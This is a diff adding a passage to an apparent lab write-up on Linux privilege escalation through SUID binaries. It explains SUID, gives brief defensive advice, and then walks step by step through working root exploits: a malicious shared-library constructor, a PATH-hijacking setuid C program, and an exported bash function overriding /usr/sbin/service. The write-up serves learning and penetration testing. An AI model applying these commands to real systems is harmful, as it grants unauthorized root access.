@@ -388,3 +388,205 @@ and final command **`sudo LD_PRELOAD=/tmp/x.so apache2`**
 ![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-13 050921.png)
 
 You should check sudo version by this command `sudo -v`  and search about any exploit
+
+# SUID
+
+**SUID (Set User ID)** is a special permission in Unix/Linux systems that allows a user to run an executable file with the permissions of the file owner, rather than with the permissions of the user who runs it. This can be particularly useful, but also potentially dangerous, in the context of privilege escalation.
+
+### **How SUID Works**
+
+- When an executable file has the SUID bit set, it runs with the privileges of the file's owner rather than the privileges of the user executing it.
+- For example, if a binary file owned by the `root` user has the SUID bit set, any user who executes that file will temporarily gain `root` privileges while the file is running.
+
+### **Identifying SUID Files**
+
+You can identify SUID files on a system using the `find` command:
+
+```bash
+ find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+- `perm -4000`: Finds files with the SUID bit set.
+- `2>/dev/null`: Suppresses error messages about directories you don’t have permission to search.
+
+### **Privilege Escalation Using SUID**
+
+In the context of privilege escalation, attackers often look for SUID binaries that can be exploited to gain higher privileges. Here’s how this could happen:
+
+1. **Misconfigured SUID Binaries**: If a SUID binary is poorly configured or has vulnerabilities (e.g., buffer overflows, path traversal), an attacker could exploit it to execute arbitrary code with elevated privileges.
+2. **Custom Scripts or Binaries**: If a custom script or binary with the SUID bit set is available, and it doesn't properly sanitize inputs or has some other flaw, an attacker could exploit this to execute commands as the file owner.
+3. **Exploiting Common Binaries**: Some common binaries, if configured with SUID, can be used by attackers to spawn shells or run commands as `root`. For example:
+    - **`/bin/bash`**: If the `bash` binary is set with the SUID bit and owned by `root`, executing it could give a root shell.
+    - **`/usr/bin/vim`**: If `vim` has SUID set, an attacker could use it to open a shell with root privileges using `:!sh`.
+
+### **Example of SUID Exploitation**
+
+Let's assume there is a SUID binary `/usr/local/bin/suid_binary` owned by `root`:
+
+```bash
+ls -l /usr/local/bin/suid_binary
+-rwsr-xr-x 1 root root 12345 Jan 1 12:34 /usr/local/bin/suid_binary
+```
+
+The `s` in the file permissions (`rwsr-xr-x`) indicates that the SUID bit is set.
+
+If this binary has a vulnerability, such as allowing the user to execute shell commands without dropping root privileges, an attacker could exploit it as follows:
+
+```bash
+/usr/local/bin/suid_binary
+```
+
+If exploited, the attacker might be able to execute:
+
+```bash
+sh
+```
+
+and gain a root shell.
+
+### **Defending Against SUID Exploitation**
+
+- **Minimize SUID Binaries**: Reduce the number of SUID binaries on the system to only what is necessary.
+- **Regular Audits**: Regularly audit SUID binaries to ensure that they are secure and necessary.
+- **Proper Permissions**: Ensure that custom scripts or binaries with SUID are properly secured and do not allow unintended command execution.
+
+SUID can be very powerful and useful for legitimate administrative tasks, but it can also be a significant security risk if not properly managed. Understanding how SUID works and how it can be exploited is crucial for both defending against privilege escalation attacks and for penetration testing purposes.
+
+## Examples :-
+
+In the first do this command **`find / -type f -perm -04000 -ls 2>/dev/null`  and see results :-**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 155818.png)
+
+We found interesting files `/usr/local/bin/suid-so`  `usr/local/bin/suid-env`  
+
+`usr/local/bin/suid-env2` 
+
+we will take action in this files  `/usr/local/bin/suid-so` we do this command 
+
+**`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 160648.png)
+
+we found this from output **`/home/user/.config/libcalc.so` we should make directory and show flowing steps `mkdir /home/user/.config` and create file `libclac.c`** 
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+and flow steps to run this file you should run this command to make file execute
+
+**`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 161635.png)
+
+we got root :)
+
+### Second file `usr/local/bin/suid-env`
+
+let how can use this we will cat this file but we didn’t under stand any thing
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 164717.png)
+
+we will use this command **`strings /usr/local/bin/suid-env`** 
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 164819.png)
+
+okay from the output we found this `service apache2 start`
+
+we do simple script give us root access 
+
+**`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`**
+
+and flow steps to run this file you should run this command to make file execute
+
+**`gcc /tmp/service.c -o /tmp/service`** 
+
+and add this to PATH 
+
+**`export PATH=/tmp:$PATH`**
+
+to git root access 
+
+**`/usr/local/bin/suid-env`**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 171057.png)
+
+we got root :)
+
+### Third file `usr/local/bin/suid-env2`
+
+we do same thing from second file and run this command `strings **/usr/local/bin/suid-env2**`
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 172310.png)
+
+we found this `/usr/sbin/service apache2 start` 
+
+we will do give us root access 
+
+**`function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`**
+
+The function you've provided is a shell function that, when executed, could be used to escalate privileges by leveraging the `SUID` (Set User ID) bit. Let's break down the function step by step:
+
+### **Function Definition:**
+
+```bash
+bashCopy code
+/usr/sbin/service() {
+  cp /bin/bash /tmp &&
+  chmod +s /tmp/bash &&
+  /tmp/bash -p;
+}
+```
+
+This defines a shell function named `service`, which performs the following actions:
+
+### **1. `cp /bin/bash /tmp`:**
+
+- **`cp`**: This command copies files.
+- **`/bin/bash`**: This is the full path to the Bash shell binary, which is a commonly used command-line shell in Unix/Linux.
+- **`/tmp`**: This is a temporary directory, writable by all users, often used for storing temporary files.
+    
+    **Action:** The function copies the `bash` binary to the `/tmp` directory. This creates a new `bash` executable at `/tmp/bash`.
+    
+
+### **2. `chmod +s /tmp/bash`:**
+
+- **`chmod`**: This command changes the permissions of a file.
+- **`+s`**: This flag sets the SUID (Set User ID) bit on the specified file.
+    
+    **Action:** The `chmod +s` command sets the SUID bit on the `/tmp/bash` binary. When a binary with the SUID bit set is executed, it runs with the privileges of the file's owner, rather than the user who launched it. Since the original `bash` binary is owned by `root`, this new `/tmp/bash` will also run with `root` privileges when executed by any user.
+    
+
+### **3. `/tmp/bash -p`:**
+
+- **`/tmp/bash`**: This is the copied Bash shell now residing in `/tmp`.
+- **`p`**: This option tells `bash` to start without dropping privileges. Normally, when a SUID program runs, it may drop privileges for safety reasons. The `p` option prevents `bash` from doing this, maintaining the elevated privileges.
+    
+    **Action:** The function then executes the `/tmp/bash` shell with the `-p` flag, which starts a new shell session with root privileges without dropping them.
+    
+
+and run this command **`export -f /usr/sbin/service`**
+
+### **What Does `export -f /usr/sbin/service` Do?**
+
+- **Assumes the Function Exists:** Before running `export -f /usr/sbin/service`, the `/usr/sbin/service` function must already be defined in the current shell session. For example, the function we discussed earlier that copies `bash`, sets the SUID bit, and then launches a root shell.
+- **Exports the Function:** `export -f /usr/sbin/service` makes the `/usr/sbin/service` function available in any subshell or child process that is spawned from the current shell.
+
+### **Why Export the Function?**
+
+- **Persistence Across Commands:** If you're running a series of commands or scripts that will create new subshells, exporting the function ensures that it remains available for use in these new environments.
+- **Privilege Escalation in Scripts:** If the `service` function was defined to perform a privilege escalation task, exporting it allows you to invoke this function within any child process or script without redefining it. This could be particularly useful in a complex exploit scenario where multiple scripts or subshells are involved.
+
+and go to root shell by this command **`/usr/local/bin/suid-env2`**
+
+![image.png](assets/img/Linux-PrivEsc/Screenshot 2024-08-14 174025.png)
+
+we got root :)
